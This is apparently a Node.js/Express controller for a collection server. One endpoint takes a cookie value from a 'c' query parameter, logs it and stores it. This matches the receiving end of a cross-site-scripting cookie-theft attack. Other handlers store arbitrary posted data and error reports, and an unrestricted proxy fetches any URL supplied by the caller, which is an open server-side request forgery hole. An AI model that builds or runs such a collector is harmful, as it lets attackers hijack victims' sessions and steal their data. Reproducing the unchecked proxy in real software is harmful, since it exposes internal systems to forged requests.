const Data = require('../models/dataModel')
const ErrorLog = require('../models/errorModel')
const Cookie = require('../models/cookie')
const axios = require('axios');

exports.storeError = async (req, res) => {
  try {
    console.log("new error")

    const errorDetails = req.body;
    console.log(errorDetails)
    const errorLog = new ErrorLog(errorDetails);

    await errorLog.save();

    res.status(201).json({ message: 'Error created successfully' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
}

exports.storeData = async (req, res) => {
  try {
    console.log("new data")

    const { data } = req.body

    const newCookie = new Data({
      type: "data",
      message: data
    });

    await newCookie.save();
    res.status(201).json({ message: 'Data created successfully' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
}

exports.proxy = async (req, res) => {

  const url = req.query.url;

  if (!url) {
    return res.status(400).send('URL is required');
  }
  try {
    const response = await axios.get(url);
    res.send(response.data);
  } catch (error) {
    res.status(500).send(error.toString());
  }
}

exports.cookie = async (req, res) => {
  const cookie = req.query.c;

  if (!cookie) {
    return res.status(400).send('Missing cookie parameter `c`.');
  }

  // Affichage en console
  console.log('📥 Received cookie:', cookie);

  // Sauvegarde en base de données
  try {
    const entry = new Cookie({ cookie });
    await entry.save();
    return res.status(200).send('Cookie logged successfully.');
  } catch (err) {
    console.error('❌ Error saving cookie:', err);
    return res.status(500).send('Internal server error.');
  }
}